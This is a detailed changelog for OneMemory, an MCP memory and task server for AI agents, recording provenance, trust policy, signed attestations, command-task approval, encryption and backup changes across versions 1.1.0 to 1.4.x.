- docs/trust.md, provenance.md (a field glossary: which field answers which question, who sets it, whether
  distrust reads it, and why the fields were not collapsed), configuration.md (the real
  `ONEMEMORY_TRUSTED_ATTESTERS` format, the new variables), architecture.md (`trust_policy`, `/trust*`,
  `/runner/status`, schema v14), tasks.md, SECURITY.md (replay, synced folders) and SKILL.md (`trust_policy`,
  the admin-only option) updated. Shipped docs no longer link to `RUNNER.md` (which is not in the npm package);
  the links point at the repository, and a test checks every relative link in the packed markdown.
- Three tests that did not test what their names said were fixed: "survives a reopen" (now reopens a file),
  "two processes at once" (now two real child processes), "not named runner-*" (now checks that no shipped
  module imports a runner module). The pack smoke test extracts the tarball with Node (no `tar` binary).
- 51 new tests (1186 to 1237): `test/trust-141.test.ts`, `test/trust-gate-guard.test.ts` and additions in the liveness,
  migration and policy suites.

### Not covered (stated plainly)
The distrust list is still a policy on labels; a file that omits every writer field carries no taint; replaying
an old signed export is possible (`not_after` retires a key, not a note); the heartbeat check trusts the
`runner` label, which anyone holding that token can use. Windows and macOS were not exercised in this review.

## [OneMemory 1.4.0] - 2026-10-24

Trust. A server can now say whom not to believe, name writers across servers, and vouch for
the writers it exports; the runner liveness signal is per machine. **Schema v14** (was v13): read
[docs/trust.md](./docs/trust.md) before upgrading.

### Added
- **Stable writer identity.** Each database has a `server_id` (random UUID, kept in the file). Notes,
  tasks, handoffs and feed entries return `writer_id` = `<server_id>/<label>` beside `written_by`
  (additive). Filters and rules accept a label or a writer id. `server_id` is in every export.
- **`distrust_writers`**: an admin-managed per-namespace (or `*`) list, honoured by every read path
  (store list/search/semantic/neighbours/feed/stats, search and relevant services, tasks, handoffs,
  catch-up, MCP, REST, CLI `recall`/`relevant`/`changes`/`watch`, dashboard). Hidden by default with
  exact totals; `include_distrusted` opts in and marks `distrusted`. `task_claim`/`task_approve` refuse
  distrusted tasks and the runner never runs a distrusted command task (even one approved earlier). Matches
  current `written_by`, a verified `attested_writer`, and `merged_from_writers`. New: `trust_policy` MCP tool
  (admin, 22 tools now), `GET/POST/DELETE /trust*` (admin), `onememory trust ...`. Changes are logged
  (`trust_log`, audit).
- **Signed writer attestations.** Per-database Ed25519 key (`.attest-key` beside the database, mode 0600,
  never exported, not in `onememory backup`). `GET /export` and `export --format json` carry a header
  (`server_id`, `key_id`, public key) and a detached attestation per note (`?attest=0` / `--no-attest`
  switched them off, and then returned the pre-1.4.0 shape; 1.4.1 makes that the default, see below). Import verifies against the admin's attester list plus `ONEMEMORY_TRUSTED_ATTESTERS`; a verified
  note keeps `attested_writer` / `attested_by`, anything else imports exactly as before. Tamper tests cover
  content, writer, namespace, timestamp and id. `onememory import --file backup.json` is new.
- **Per-runner heartbeats and status.** Heartbeat note `runner heartbeat: <machine>`; `runner_status`,
  `GET /runner/status` and `onememory runner-status` gain a `targets` list (backward compatible totals
  and `runner` summary).
- **Feed and recall filters.** `written_by` / `not_written_by` / `include_distrusted` on `catch_up`,
  `state_relevant`/`POST /relevant`, handoffs and CLI; explicit `note_written_by` / `not_note_written_by`
  on the feed (event versus current-writer semantics, documented). Index `idx_change_log_writer`.
- **Durable authorship.** A delete records the original author (`note_written_by`); consolidation stores
  `merged_from_writers`, so `not_written_by` and distrust treat the merged note as touched by every source.
- File sync writes `origin_writer` in front matter (an unverified claim, shown as `imported_written_by`).
- Dashboard: runner banner per target, "distrusted" toggle with a DISTRUSTED badge, import result shows
  attestation counts.

### Changed
- **Breaking-ish: legacy runner heartbeats.** A heartbeat with no writer marker (runner older than 1.3.4) is
  no longer believed. Update the runner, or set `ONEMEMORY_RUNNER_ACCEPT_LEGACY=1` on the server meanwhile.
- `GET /export` JSON is now `{"export": {...header}, "notes": [...]}` (still streamed). *(Correction made in
  1.4.1: this entry said `?attest=0` kept the header with unsigned notes. It did not: `?attest=0` returned the
  pre-1.4.0 `{"notes": [...]}` exactly. 1.4.1 restores that shape as the default.)* `onememory import --file`
  and `POST /import` read both shapes.
- `catch_up` and the recall notice return early (no work) when no command task is queued.
- Removed the `tasks.ts` <-> `liveness.ts` import cycle (shared rule now in `task-core.ts`).

### Upgrade and rollback
First open of a v1 to v13 database copies it to `<db>.pre-v14-backup` (never overwritten), then upgrades in one
transaction. Roll back by stopping every process and putting the copy back (docs/trust.md). Tested from v11,
v12 and v13, plain and encrypted. Restoring a database file keeps its `server_id`, not its `.attest-key`.

### Not covered (stated plainly)
Attestations prove who signed what, not that content is true; they have no revocation or freshness.
The distrust list is a policy on labels, not a boundary against the operator. Cost of `not_written_by` and
`note_*` filters grows with the feed window (measured 110 to 580 ms on 300,000 events).

## [OneMemory 1.3.4] - 2026-10-24

"Runner offline, N commands waiting." An approved command task used to wait
silently when the PC was off or asleep. Now the store says so. No schema version
change from 1.3.3 (still v13). Also tightens 1.3.3's "who wrote this" after review.

### Added
- `runner_status` (MCP, read scope), `GET /runner/status` (REST, read token) and
  `onememory runner-status [--json]`: the runner's state (`online` / `stale` /
  `never_seen`) and, per readable namespace, the approved commands still waiting,
  those whose approval ends within an hour, approvals that already expired, and the
  oldest waiting age (human durations on the command line). Counts, ages and ids
  only: never command text, params, targets or the host name. Counts are "at least"
  (`truncated: true`) past 2,000 queued tasks.
- "Waiting" is decided by the runner's own selection rule, now one shared function
  (`classifyQueuedCommand`): the runner's task namespace, `target` = this runner,
  a valid unexpired approval, no live lease. A command for another machine or
  namespace is not counted and never triggers the offline notice. The runner's
  heartbeat now also publishes its task namespace and beat interval.
- The heartbeat is judged by the note's server timestamp, not the `alive_at` in the
  body, only when written by the runner process (new writer marker `runner`), and
  never from the future. Forged or clock-skewed heartbeats no longer keep a dead PC
  "online". Expired approvals are counted only when their signature verifies.
- `ONEMEMORY_RUNNER_STALE_SECONDS` (default 600, never below three beat intervals).
- One-line notice (waiting commands on a runner that is not online, or expired
  approvals even when it is): a `runner_notice` field on `catch_up`, a line in the
  SessionStart recall, and a banner on the dashboard. Absent otherwise.
- `note_written_by` (the note's current writer) on every `/changes` and `memory_since`
  entry; `written_by` / `not_written_by` on `task_list` and `GET /tasks`;
  `merged_from_writers` on a consolidate result.
- A pack smoke test: `npm pack`, unpack, run `runner-status` and the MCP stdio server
  to `tools/list` from the tarball, and check every relative import is packed.

### Changed
- **Fixed before release:** the `files` list in package.json drops `dist/src/runner*`,
  which would have stripped the new module from the npm package and crashed the MCP
  server and `runner-status`. The module is now `src/liveness.ts`.
- `written_by` now means who last changed the note's **content** (title or body).
  Tag-only edits, task claim / lease / approve / status, the runner's outcome write,
  archive / restore and `source` edits no longer take it over; the actor is still in
  the change log. Merges are stamped with the merger and report the sources' writers.
- Change-log triggers are permanent and copy the note's writer (a quarantined write that
  an admin approves now shows its author in the change feed, not the approver). Existing
  v13 files made by 1.3.3 are repaired on first open. Deletes are attributed to the deleter.
- The "WHO WROTE THIS" block JSON-quotes `source`, `created_by` and `imported_written_by`.
- Writer labels are normalised before the marker check (`" cli "`, `CLI`, `token:cli` can no
  longer collide with a marker or each other); labels over 100 characters get a hash suffix and
  the filters apply the same rule.
- The index on `notes(written_by)` is replaced by `(namespace, written_by, updated_at DESC)`.
- Upgrade safety: the first v12 to v13 migration of a non-empty database leaves
  `<db>.pre-v13-backup` (never overwritten). `onememory recall` never migrates a database.
- docs/RUNNER.md: the wait, the approval expiry and the status. docs/provenance.md: exactly what
  `written_by` means, upgrade and rollback, limits. Tool count in docs and test corrected to 21.

### Planned (not built)
`distrust_writers` policy, signed writer attestations, stable cross-server writer ids,
per-target runner heartbeats. See docs/provenance.md.

## [OneMemory 1.3.3] - 2026-10-24

"Who wrote this?" A note now records which connection wrote it, stamped by the
server so a client cannot forge it. **Schema is now v13** (additive columns; see
"Changed"): a database opened by 1.3.3 cannot be opened by 1.3.2 or older. Back up
before upgrading.

### Added
- `written_by` (last writer) and `created_by` (first writer) on every note: the
  authenticated token's label, or `stdio` / `cli` / `server` for writers with no
  token. Set on create and on every update, from the connection only: a
  `written_by` / `created_by` in a request body is ignored. A token labelled like a
  marker is stored as `token:<label>`.
- Returned on read, list, search, `state_relevant`, export, tasks, handoffs and in
  change-feed entries. MCP results get a second "WHO WROTE THIS" block (writer first,
  the writer's `source` claim labelled unverified); the SessionStart recall names the
  writer.
- `written_by` / `not_written_by` filters on `state_list`, `state_search`,
  `memory_since`, `memory_ack` and the REST equivalents (`GET /notes`, `/search`,
  `/changes`, `POST /ack`). They respect namespace scope.
- Import: the importing caller is stamped as the writer; an export's `written_by` is
  kept only as a separate `imported_written_by` claim. A quarantined write keeps its real
  author when approved.
- docs/provenance.md and a README section "Who wrote this?".

### Changed
- Schema v13: `notes.written_by`, `notes.created_by`, `notes.imported_written_by`
  (default `''`), `change_log.written_by`, `quarantine.written_by`, and an index on
  `notes.written_by`. Rows written before v13 read `''` (unknown); they are not
  guessed from `source`. Tested upgrading from v11 and v12 databases.
- `source` is documented, and described in the MCP tool schema, as an unverified claim.
- `written_by` is plaintext, like title and tags (so it can be filtered); it is not
  note content.

### Not included
- A `distrust_writers` trust policy or per-note trust flag (idea only; see docs/provenance.md).

## [OneMemory 1.3.2] - 2026-10-24

Test-only fix for Windows CI. No runner/allowlist change, no schema change (still v12).

### Fixed
- Root cause of the Windows command-task failures: GitHub's Windows temp directory is an 8.3 short path (`C:\Users\RUNNER~1\...`). The tests' marker-parameter pattern allowed `:` and `\` (1.3.1) but not `~`, so the runner correctly refused the parameter ("does not match the allowed pattern") and never spawned. The pattern now also allows `~` and space. The runner's anchored-pattern check, `shell:false` execution and allowlist strictness are unchanged. Real allowlists are operator-written, so a Windows install only needs a pattern that admits the paths it uses.

### Tests
- Added a regression test for the Windows-style path against the pattern (and injection strings still rejected); the main command-task test now prints the runner's result if the marker is missing.

## [OneMemory 1.3.1] - 2026-10-24

Fix release: package name, CI, and Windows. No schema change (still v12).

### Fixed
- Package name is `onememory-mcp` again everywhere (package.json, lockfile, README, INSTALL, INFRA, docs, publish workflow, the schema-too-new error message). 1.3.0 was published under this name; the repository had been pointing at a scoped name by mistake.
- `new Store(...)` that throws part-way (corrupt or directory-valued key file, schema newer than the code) now closes the SQLite handle it opened. Before, the file stayed locked, which on Windows made the data directory impossible to delete.
- Security audit: dependencies updated so `npm audit --audit-level=high` is clean (body-parser, fast-uri, hono via lockfile; `zod` raised to `^4.6.7`, 3.x has no patched release). Type-check and the full test suite pass on zod 4; this is a major-version bump of a direct dependency, so please report any schema-validation difference.

### Tests (Windows CI)
- Command-task tests allowed only POSIX path characters in the marker parameter, so a `C:\...` temp path was refused by the allowlist pattern and nothing ran. The pattern now allows `:` and `\`. The runner itself already ran commands without a shell; no runner change was needed.
- Tests that start a child process now wait for it to exit before deleting its directory, and temp-dir cleanup retries (Windows holds files open briefly).
- The SIGTERM graceful-drain test is skipped on Windows only, which has no SIGTERM (a kill there is a hard terminate). It still runs on Linux and macOS.
- Windows was not run locally; these fixes are reasoned from the CI log, not executed on Windows.

## [OneMemory 1.3.0] - 2026-10-24

Cross-device / cross-model awareness: every session can see what the others
did and plan, and a task can now drive the PC's runner. Tasks, handoffs, leases
and approvals are tagged notes (no new table). **Schema is now v12** (one added
column, `change_log.actor`; see "Changed"):
a database opened by 1.3.0 cannot be opened by 1.2.x. Back up before upgrading.
Existing behaviour is unchanged unless you use the new parameters and tools,
with the exceptions listed under "Changed".

### Added

- **Live wait on the change feed.** `GET /changes?...&wait=<0-55>` (alias
  `wait_seconds`) and `memory_since { wait_seconds }` (alias `wait`) hold the
  request until something changes in the caller's scope, then answer like a
  normal read; on timeout they return the empty page with `timedOut: true`.
  **Use 25**: a 55s wait died at exactly 30.0s behind a 30s-idle proxy (55 stays
  the cap). In-process writes wake it immediately; writes by another process are
  noticed by a jittered ~1s poll (`ONEMEMORY_WAIT_POLL_MS`). Caps: 16 per token,
  32 per namespace scope, 64 per process (`ONEMEMORY_WAIT_MAX_PER_TOKEN`,
  `_PER_NAMESPACE`, `_TOTAL`); the 429 / tool error names the limit. A client
  disconnect or a server shutdown frees the slot (shutdown returns `timedOut`
  cleanly and drains in milliseconds). Not combinable with `cursor` (400).
- **Task board.** MCP `task_put` / `task_get` / `task_list` / `task_claim` and REST
  `POST /tasks`, `PUT /tasks/:id`, `GET /tasks[/:id]`, `POST /tasks/:id/claim`:
  status, next step, owner, plus `priority` (0-9), `due`, `parent_id` and
  `blocked_by[]` (validated, cycles refused), `if_rev` compare-and-swap, and
  `client_key` idempotency (a retried create returns the existing task,
  `replayed: true`). `task_claim` is a compare-and-swap lease with heartbeat,
  release and expiry. Stored as tagged notes (no new table).
- **Session handoffs.** `session_handoff` / `POST|GET /handoffs`, with `client_key`.
- **`catch_up`** (MCP) / `GET /catch-up`: changes since this consumer last
  looked + open tasks (compact: no notes, no command text) + latest handoffs in
  one call.
- **Acknowledged reads.** `ack_mode: "manual"` on `memory_since` / `catch_up` /
  `GET /changes`: the "last" marker moves only when the returned `ack_token`
  comes back (`ack_token` on the next call, `memory_ack`, or `POST /ack`), so a
  client that dies mid-delivery gets the changes again. Default stays `auto`
  (marker moves on delivery, at-most-once); manual is at-least-once.
  `exclude_self` hides a consumer's own writes: changes whose recorded **writer**
  (the label of the token / MCP connection that made the write, `change_log.actor`)
  equals the consumer label. It is not the note's `source`, which any client can
  set freely. Writes with no recorded writer (CLI, scripts, rows from before v12)
  fall back to `source`. It only separates devices that use different token labels.
- **Command tasks** (see docs/RUNNER.md). `task_put({command, target})` queues a
  task; an **admin** `task_approve` is required before this PC's runner will
  run it, and only if the target is that runner's own id, the task is in
  `ONEMEMORY_RUNNER_TASK_NAMESPACE` (off by default) and the action passes the
  same allowlist as a signed command note. The approval is a MAC over namespace,
  id, a single-use nonce, an **expiry** (default 24 h, `ONEMEMORY_APPROVAL_TTL_SECONDS`)
  and a hash of the command and target. `task_approve` must echo the task's
  `command_hash` (shown by `task_get` / `task_list`) or its `rev`, and is refused
  if the command changed since the admin read it. The runner removes the approval in
  the same compare-and-swap write that marks the task running, so a crash or a lost
  ledger cannot replay it. Edits void the approval; the MAC is compared in constant
  time; the runner finds approved tasks with an SQL filter (paged until exhausted),
  and a namespace holds at most 100 queued command tasks
  (`ONEMEMORY_TASK_COMMAND_QUOTA`), so a write token cannot bury an approved task.
  A command task cannot be claimed, and approve / revoke clear any lease on it. The
  runner signs with its own secret in memory; no token can read or hold it. There
  is no "read-only skips approval" class: the allowlist has no such flag.
- **`onememory backup [--out dir] [--include-approval-key]`**: consistent hot copy
  (`VACUUM INTO`, safe while the server runs) plus the `.key` file (0600) with a loud
  warning to store it separately. The command-task **approval key is NOT copied**
  unless you pass `--include-approval-key`: a restored backup then has stale
  approvals (fail closed) and an admin re-approves what is still queued. (The key is
  stored unencrypted in the database's `_meta`; it is not covered by `.key`.) **`onememory watch [--exec prog args...]`**: long-poll loop that
  prints changes and optionally runs a program per batch (no shell; data on stdin;
  marker moves only on exit 0). SIGINT / SIGTERM kill the running handler and stop
  the loop; a second signal exits at once.
- **`onememory recall`** prints open tasks (up to 10) and the latest handoff before
  the recent notes, each with its own budget (a long task list never cuts the
  handoff), a header that counts all open tasks, and every field reduced to one
  printable line.
- `audit.log` records task / command-task / claim / approve / handoff / catch_up /
  ack events with the token **label** and a `kind`, and rotates by size
  (`ONEMEMORY_AUDIT_MAX_BYTES`, `ONEMEMORY_AUDIT_KEEP`). The server prunes the change
  log hourly on a timer, not only when the feed is read.
- `Store.list` accepts `withTags` / `withoutTags` (exact, case-sensitive tag filters);
  `Store.onChange` / `Store.changeHeadSeq` back the live wait.

### Changed (read before upgrading)

- **Reserved tags.** Plain note writes (`POST/PUT /notes`, `state_write`, synced
  files) can no longer create a note tagged `task`, `handoff` or `task.*`, or add /
  remove those tags (400, pointing at `task_put`). Existing tagged notes can still be
  edited as long as that tag set is unchanged. Notes that merely carry `status:`,
  `owner:` or `surface:` are unaffected.
- Task titles must be one line (no newlines or control characters); next steps and
  handoff text have control characters stripped.
- `catch_up` and `memory_since` are no longer annotated read-only (they advance the
  consumer marker), `catch_up` returns compact tasks (use `task_get` for notes), and
  the per-token wait cap is 16 (was 4 in the pre-release).
- `catch_up` no longer stalls with more than 10,000 pending changes: it reads the whole
  gap with one tail query, so the marker reaches the true end and `recent` is the true
  newest. Tag filters are case-sensitive in SQL, so notes tagged `Task` can no longer
  hide real tasks from `listTasks`.
- Clearing a task's `owner` now resets the provenance `source` to `task` (it kept the
  old owner).
- **Schema v12.** `change_log` gains an `actor` column (default empty). Each `Store`
  connection stamps it with a connection-local (TEMP) trigger, so nothing about the
  stored triggers changes and other tools writing the file still work (their rows
  have an empty actor). Rows from before the upgrade have an empty actor too.
- `task_approve` / `POST /tasks/:id/approve` now require `command_hash` or `if_rev`
  (and reject a mismatch); `approve: true` on create passes the new task's rev itself.
- `task_claim` is refused for `done` tasks and for command tasks (release still works).
  `due` must be a real calendar date (`2026-02-31` is rejected).
- **Markdown import (`onememory import`) is a local admin path and now restores
  notes carrying reserved tags** (tasks, handoffs, 1.2.x notes tagged `task`), so an
  export/import round trip loses nothing. Approvals never travel by file. It prints a
  loud rejected count and exits 1 when any file was rejected (it used to say so only
  in a summary line). Plain-note writes over REST/MCP remain restricted.
- Change-log retention now records how far it purged: a `since=last` consumer whose
  marker is older than that gets `markerReset: true` (and everything still retained),
  instead of silently skipping the purged events.
- `audit.log` rotation takes a lock directory (`audit.log.lock`), so several
  processes (server plus CLI) no longer lose lines in the rename chain.
- Fixed: `onememory watch` exited immediately in a bare terminal (its timers were
  unref'd and nothing held the event loop); it now stays up.
- Task `status` gains `queued` and `failed`.

### Notes

- The MCP server now advertises 21 tools (was 12). Clients that pin the tool
  list need to refresh it.
- Live wait holds an HTTP request open; if you front OneMemory with a proxy, use
  `wait=25` (see docs/change-feed.md and INFRA.md section 8).
- The command runner is not part of the published package (see docs/RUNNER.md), so
  `task_approve` is useful only on a checkout that runs it; the tools themselves ship.
- INFRA.md gains systemd and Windows Task Scheduler recipes for OneMemory itself,
  a backup section (including the key) and a 15-minute deploy recipe.
- Known limits: an approval is a bearer decision of one admin about one command text:
  `command_hash` binds it to what was read, but the admin must still read it. The
  approval key lives in the database's `_meta` (not in `.key`); anyone who can write
  the live database file can mint approvals, so protect the file and its backups.
  `exclude_self` keys on the token label; two devices sharing one token label hide
  each other's writes. A claim does not lock a task against plain `task_put` edits of its
  other fields; command tasks need the runner running on the PC (and the PC awake);
  `onememory watch` and live waits are for scripts and agent loops, not a push to a
  chat window (chat clients still act only on a user turn); the systemd and Task
  Scheduler recipes were written but not run.

## [OneMemory 1.2.1] - 2026-10-24

**Package name:** the npm package is `onememory-mcp` (the command is `onememory`). An earlier version of this note claimed a rename to a scoped name; that was wrong. Neither the plain `onememory` name nor a scoped name was ever published.

Hardening and honesty release from an independent multi-reviewer pass over
1.2.0 (crypto and namespaces, data and retention, retrieval and MCP, docs and
release). Docs were corrected to match what actually ships.

### Changed (read before upgrading)

- **Database schema is now v11.** A database opened by 1.2.1 cannot be
  opened by 1.2.0 or older. 1.2.1 refuses a database that is newer than it
  supports, with a clear message. Back up `~/.onememory` before upgrading.
- Encrypted notes use a new `v2:` envelope (bound to note id and namespace).
  Old `v1:` notes still read, and are upgraded by `onememory encrypt enable`.
- `scripts/preinstall.cjs` (the 1.0.x data rescue) is removed: no code runs at
  install time any more. If you still have 1.0.x data inside an old global
  package folder, copy it to `~/.onememory` by hand.
- Import duplicates: importing into a store that already has the notes still
  creates duplicates by default; pass `?dedupe=1` (or `{"dedupe":true}`) to
  skip notes already present. The response gains `skipped`.
- Rate limiting counts failed logins per IP and normal traffic per token, so
  garbage from one address no longer locks out a valid token.
- **REST validation is stricter (can break sloppy clients).** `limit`/`offset`
  that are not non-negative integers (`limit` >= 1), an unknown `mode`, an
  unrecognised `when`, and a `forget_after` that is negative, non-finite or
  non-numeric now return `400` instead of being ignored. Numeric strings such
  as `"5"` are still accepted. MCP `state_search`/`state_relevant` return the
  same error.
- **User-chosen bearer tokens must be at least 32 characters**
  (`openssl rand -hex 32`); shorter ones are rejected at startup. Failed
  logins are also slowed per IP (250 ms steps, up to 2 s).
- **Downgrading:** run `onememory encrypt disable` before going back to 1.2.0,
  which would otherwise read encrypted notes as raw `v2:...` text.
- `encrypt enable` holds the database write lock for about 9 s per 100,000
  notes; other writers may see "database is locked" on very large stores.
- `?skipUnreadable=1` export markers carry no body and are rejected on import.
- If `encrypt disable` is interrupted, opening the store restores the key from
  `.key.disabling-<pid>`; with no key, writes are refused rather than stored
  as plaintext. Old v1 ciphertext is upgraded to the row-bound v2 format when
  the store is opened.

### Fixed (code)

- **Encryption.** Ciphertext is bound to its row (AES-GCM additional
  authenticated data), so a copied `body_enc` no longer decrypts in another
  note or namespace. Quarantined writes are sealed when encryption is on. The
  key is looked up consistently when `ONEMEMORY_DB_PATH` points outside the
  data directory. Turning encryption on or off while a server is running is
  refused or handled safely instead of silently writing plaintext or
  unreadable notes.
- **Namespaces.** A token whose `namespace` is present but not a non-empty
  string is rejected instead of silently becoming unpinned. `POST /sweep-expired`
  respects a pinned token's namespace. One damaged row no longer hangs
  `/export` or breaks list calls for other namespaces.
- **Retention and backups.** The background consolidation no longer merges or
  deletes archived notes. Export/import now carries `archived_at` and
  `expires_at`. Archive and restore appear in the change feed. Restoring a
  note clears its old expiry so the next sweep does not re-archive it.
  Archived notes no longer show up as neighbours or in access/stale counts.
  `encrypt enable/disable` no longer loses an edit made while it runs.
- **MCP and REST.** The MCP server reports the real package version. Bad
  `forget_after`, `limit`, `mode` and `when` values return a clear `400`
  instead of being ignored. `onememory --version` works.

### Documentation

- `SECURITY.md` rewritten to match 1.2.0/1.2.1: encryption at rest is
  shipped, with its limits stated plainly (titles, tags, timestamps, and
  embeddings stay readable; the key file sits beside the database; the
  embedding request sends the decrypted body to your embeddings endpoint).
  Added a short threat model and a Limitations section.
- README: the untrusted-data banner is on every **MCP** read (REST responses
  do not carry it); the evaluation set is described honestly (10 tasks over
  10 notes, lexically easy; a perfect score is a regression gate, not a
  quality claim); the comparison table now lists only cells with a source and
  marks the rest unverified; quickstart shortened.
- Documented `ONEMEMORY_ENCRYPT`, `ONEMEMORY_KEY_FILE`,
  `ONEMEMORY_IMPORT_MAX_BYTES`, `ONEMEMORY_URL`, and the `/notes/:id/archive`,
  `/notes/:id/restore`, `/sweep-expired` routes. `GET /changes` requires
  `since`; `POST /relevant` is a POST.
- Restoring a backup is documented as "into an empty store": importing into a
  store that already has the notes creates duplicates.
- `docker-compose.yml` publishes ports on `127.0.0.1` only, matching the
  README. `npm bin -g` (removed from npm) replaced by `npm prefix -g`.
  Example paths use `/home/you`.
- Internal review memos, roadmap, competitor notes and benchmark scripts were
  removed from the public tree (they remain in git history).

### Release engineering

- `.gitattributes` forces LF line endings (and CRLF for `.cmd`).
- The publish workflow runs on `v*` tags or manually from a tag, refuses to
  publish unless the tag equals the `package.json` version, and documents the
  exact npm Trusted Publisher settings it depends on.

## [OneMemory 1.2.0] - 2026-10-22

### Encryption at rest, retention, per-token namespaces

See `docs/encryption-retention.md` and `docs/token-namespaces.md` for the
full detail, including the tradeoffs each one makes.

- **Encryption at rest (AES-256-GCM).** Note bodies are encrypted on disk;
  the key is a 32-byte `0600` file at `~/.onememory/.key`, created on first
  `onememory encrypt enable`. Enable, status and disable are CLI commands.
  The honest cost: a plaintext FTS5 index cannot index ciphertext, so with
  encryption on the body column stays empty, ciphertext lives in `body_enc`,
  and keyword search covers **title + tags only**. Titles, tags and
  timestamps stay plaintext for the same reason search and namespace
  isolation need to read them; use OS disk encryption for full-file cover.
- **Retention: TTL + archive.** `forget_after` (days) is stored as an
  absolute `expires_at`, computed from `updated_at` so editing a note resets
  its clock; `forget_after: 0` clears it and omitting it on update preserves
  it. `POST /sweep-expired` archives every past-due note (idempotent, returns
  the count, safe on a timer). An archived note is excluded from `list`,
  keyword search, semantic search and the SessionStart recall hook —
  genuinely forgotten by every read surface — but stays on disk and is
  restorable, the reversible alternative to `DELETE`. `GET /notes` hides
  archived notes by default (`?includeArchived=1`, `?archived=1`).
- **Per-token namespace permissions.** A token can now carry an optional
  `namespace`, so one shared server confines each agent to its own
  namespace instead of every token seeing the same one. This is the piece
  that makes a shared bridge safe: scoped tokens gated *actions* but never
  *which namespace*. Tokens without a namespace behave exactly as before.

### Retrieval quality: evaluation set and explain

- **A retrieval evaluation set (`evals/cross-device-tasks.json`).**
  Prompted by community feedback: repeated cross-device tasks scored with
  recall@1, recall@5 and MRR, seeding a fresh store per task so access-count
  feedback from one query cannot leak into another's ranking. It **gates**:
  a ranking, FTS or schema change that quietly degrades retrieval fails CI
  rather than shipping. Access boost is disabled during scoring for the
  same determinism reason.
- **Retrieval explain.** Search ranking is three multiplicative stages —
  native relevance (bm25 / cosine / RRF), recency-decayed access boost, then
  graded staleness penalty — and every intermediate used to be discarded.
  `GET /search?q=...&explain=1` now attaches a `breakdown` to each result
  computed from the same functions the scorer uses, so the explanation
  cannot drift from the ranking. `finalScore = baseScore × accessBoost ×
  stalePenalty` holds exactly, and results and their order are identical
  with and without `explain=1` — explaining never reorders.

### Backup / restore at scale — the "a few months of revisions piled up" case

Prompted by community feedback about stores with months of accumulated edits.

- **`GET /export` streams.** It used to materialize every row, record and the
  full JSON string at once (~3x the backup size in memory). It now pages the
  store by primary key (`exportBatch`, 500 notes/page) and writes each page as
  it is built, with socket backpressure respected. Peak memory is one page
  regardless of store size; the response body is byte-identical to before
  (`{"notes":[...]}`). `onememory export --format json` streams the same way
  to stdout or `--out`.
- **`POST /import` accepts a real backup.** The restore path had the general
  1MB request cap, so a ~2000-note backup could be exported but not restored
  (413). It now has its own cap (`IMPORT_BODY_BYTES`, 256MB), still admin-only.
- **Bulk restores land in seconds.** Importing wrote one transaction (one WAL
  fsync) per note, and then rebuilt the similarity graph inline — linking alone
  is O(n²) and measured at 88–97% of restore time (8000 notes: 3.6s of inserts
  vs 34.9s of linking). Inserts are now batched one transaction per 500 notes
  (`IMPORT_INSERT_BATCH`), and imports over 200 notes defer the graph rebuild
  and say so in the response — run `onememory rebuild-edges` afterwards.
  Search is unaffected by a deferred graph.
- **Revisions survive a restore.** `rev` is now part of the backup and is
  restored (sane values only; garbage falls back to 1), so a note with 25
  revisions behind it does not restart at 1 after a restore — compare-and-swap
  guards and the change feed stay accurate. Together with the existing
  `created_at` / `updated_at` preservation, a backup restores with its
  history intact.
- **What a backup is (documented):** OneMemory stores only the *latest*
  version of each note — `rev` is a counter, not a snapshot — so a
  revision-heavy store exports as one entry per note with its latest body,
  and export cost tracks note count, not edit count. Per-edit history lives
  in the `change_log` (metadata only, pruned after 90 days, not part of a
  JSON backup). See the README "Backups & restore" section.

### Tests & CI

- **Two CI flakes fixed at the root.** The change-feed tests captured a
  `since` boundary from the caller's clock while SQLite stamps `changed_at`
  from its own — a boundary could land on either side of the very write it
  was meant to include or exclude (~1-in-10 standalone, and it failed the
  Windows runner). Every boundary now has settle time on both sides:
  0/300 stress runs after the fix. And the `npm pack` guard read only the
  npm 11 array shape, so it broke as soon as a runner drifted onto npm 12
  (`npm pack --json` now returns an object keyed by package name, which the
  publish workflow installs on purpose); it now accepts both shapes, verified
  against npm 11.16.0 and 12.2.1.

## [OneMemory 1.1.0] - 2026-10-16

### Upgrade notes

- **Run `onememory rebuild-edges` once after upgrading a 1.0.0 store.**
  Migration v4 creates the similarity-edge table but does not score
  existing notes, so they have no neighbors until a rebuild (new writes are
  linked automatically). `onememory doctor` now warns when a store has
  notes but no edges.
- **Your data moves out of the package.** 1.0.x kept `state.db` and
  `.token` in the installed package's `data/` folder, which `npm update` or
  an npx cache cleanup deletes. 1.1.0 uses `~/.onememory`
  (`%USERPROFILE%\.onememory` on Windows; override with `ONEMEMORY_HOME`).
  `npm install -g onememory-mcp` deletes the old package folder (with its
  `data/`) before 1.1.0 ever runs, so a `preinstall` step copies the
  retiring copy's `state.db` (a consistent `VACUUM INTO` snapshot) and
  `.token`, `tokens.json`, `spaces.json` into `~/.onememory` first, if that
  has no `state.db` yet; it never fails the install. A start that still
  finds `<package>/data/state.db` (npx, local installs) copies it too, under
  a lock, and prints the move; the old copy is left in place.
  **Belt and braces — before upgrading**, copy the data yourself:
  `mkdir -p ~/.onememory && cp -Rn "$(npm root -g)/onememory-mcp/data/." ~/.onememory/`
  (stop the server first; Windows: copy `%APPDATA%\npm\node_modules\onememory-mcp\data\*`
  to `%USERPROFILE%\.onememory\`).
  A from-source git checkout that already has `./data/state.db` keeps using
  it. `ONEMEMORY_DB_PATH` still pins the database. `onememory doctor` shows
  the data directory and warns if it is inside `node_modules`. Docker
  images now set `ONEMEMORY_HOME=/data`, so the token persists on the volume.
- The data directory is owner-only on POSIX: `~/.onememory` is `0700`,
  `state.db` (+ `-wal`/`-shm`), `audit.log`, token files, migrated files,
  `export --out` dumps and sync temp files are `0600`; existing looser modes
  are tightened on every start.
- Schema migrations v1–v9 run automatically on first open; no manual step.
  The whole upgrade is one transaction, safe when several processes (agents,
  server, CLI) open the old database at the same moment. v7/v8 are additive
  (`quarantine`, `sync_map`, `sync_base`, an `updated_at` index, the
  `change_log` + its triggers; v9: `sync_deleted` and title-blanking
  change-log triggers). The change feed is seeded from notes changed
  in the last 90 days; deletes made under 1.0.x are not in it.
- **No downgrade after 1.1.0.** Once 1.1.0 has opened a database, don't
  run 1.0.x against it again (keep a copy of `state.db` from before the
  upgrade if you might need to roll back).

### Added

- **Change feed** — MCP `memory_since`, REST `GET /changes`, CLI
  `onememory changes`, dashboard "Changes" view. `since` is an ISO time, a
  duration (`24h`, `7d`) or `last` (a per-`consumer` marker, advanced only
  after the final page; first use = last 24h). Returns created/updated/
  deleted notes (titles only) with totals grouped by provenance source, a
  frozen window and signed cursor paging. Driven by a trigger-written local
  change log with a monotonic sequence, so imports/restores that keep an
